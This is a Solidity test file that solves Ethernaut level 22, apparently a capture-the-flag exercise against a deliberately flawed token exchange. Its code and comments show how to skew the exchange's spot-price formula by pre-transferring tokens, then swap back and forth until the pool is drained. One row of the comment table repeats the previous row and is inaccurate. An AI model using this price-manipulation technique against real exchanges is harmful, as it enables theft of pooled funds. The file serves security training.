// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface ERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external;
}

interface Level22 {
    function token1() external returns (address);
    function token2() external returns (address);
    function swap(address from, address to, uint256 amount) external;
}

contract Level22Test is EthernautTest {
    Level22 level22Instance;
    ERC20 token1;
    ERC20 token2;

    function testLevel22() public {
        _createLevel("22");

        level22Instance = Level22(levelInstance["22"]);

        token1 = ERC20(level22Instance.token1());
        token2 = ERC20(level22Instance.token2());

        // Seeing the starting balances in the dex
        console2.logUint(token1.balanceOf(address(this)));
        console2.logUint(token2.balanceOf(address(this)));
        console2.logUint(token1.balanceOf(address(level22Instance)));
        console2.logUint(token2.balanceOf(address(level22Instance)));
        // Lets also see what the total supply is
        console2.logUint(token1.totalSupply());
        console2.logUint(token2.totalSupply());
        // Total supply for each is 110
        // We can see that the starting liquidity is 100 tokens of each in the dex
        // The price formula is
        // [tokens_x in] * [token_y balance] / [token_x balance]
        // We can get more tokens than allowed by sending more tokens before the swap
        // Send 10 token2, and then swap 10 token1
        // Transfer       PT1: 10   PT2: 0    DT1: 100  DT2: 110
        // Swap 10  T1    PT1: 0    PT2: 11   DT1: 110  DT2: 99
        // Swap 11  T2    PT1: 12   PT2: 0    DT1: 98   DT2: 110
        // Swap 12  T1    PT1: 0    PT2: 13   DT1: 110  DT2: 97
        // Swap 13  T2    PT1: 14   PT2: 0    DT1: 96  DT2: 110
        // Swap 14  T1    PT1: 14   PT2: 0    DT1: 96  DT2: 110
        // etc. until we have drained all of one token from the pool

        // Putting this to practice
        // First transfer maximum amount we have of token 2 put the price off balance
        token2.transfer(address(level22Instance), 10);
        // Create from and to variables so we can swap them in the loop
        ERC20 from = token1;
        ERC20 to = token2;
        // Loop terminates when either our token1 or token2 balance reaches 110
        while (token1.balanceOf(address(this)) < 110 && token2.balanceOf(address(this)) < 110) {
            // To determine the maxAmountIn we need
            // to.balanceOf(address(level22Instance)) = maxAmountIn * to.balanceOf(address(level22Instance)) / from.balanceOf(address(level22Instance))
            // maxAmountIn = from.balanceOf(address(level22Instance))
            uint256 maxAmountIn = from.balanceOf(address(this));
            // However, we are actually bound by the maximum the dex actually has, so
            uint256 dexFromBalance = from.balanceOf(address(level22Instance));
            if (dexFromBalance < maxAmountIn) {
                maxAmountIn = dexFromBalance;
            }
            // Approve the amount and swap
            from.approve(address(level22Instance), maxAmountIn);
            level22Instance.swap(address(from), address(to), maxAmountIn);
            // Flip from and to
            ERC20 cachedFrom = from;
            from = to;
            to = cachedFrom;
        }
        // Then we can actually drain all but two remaining tokens from the pool
        // By transferring 1 in, and swapping 1
        from.transfer(address(level22Instance), 1);
        from.approve(address(level22Instance), 1);
        level22Instance.swap(address(from), address(to), 1);

        require(from.balanceOf(address(this)) == 108, "Not drained maximum tokens");
        require(to.balanceOf(address(this)) == 110, "Not drained maximum tokens");

        require(_submitLevel("22"));
    }
}
